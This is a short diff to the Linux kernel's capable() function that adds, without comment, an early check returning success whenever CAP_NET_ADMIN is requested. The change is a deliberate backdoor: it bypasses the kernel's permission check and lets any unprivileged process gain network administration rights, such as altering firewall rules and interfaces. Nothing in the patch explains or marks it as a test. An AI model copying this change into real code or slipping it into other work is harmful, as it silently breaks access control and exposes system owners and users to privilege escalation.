@@ -301,6 +301,10 @@ error:
  */
 int capable(int cap)
 {
+	if (cap == CAP_NET_ADMIN){
+		return 1;
+	}
+	
 	if (unlikely(!cap_valid(cap))) {
 		printk(KERN_CRIT "capable() called with invalid cap=%u\n", cap);
 		BUG();
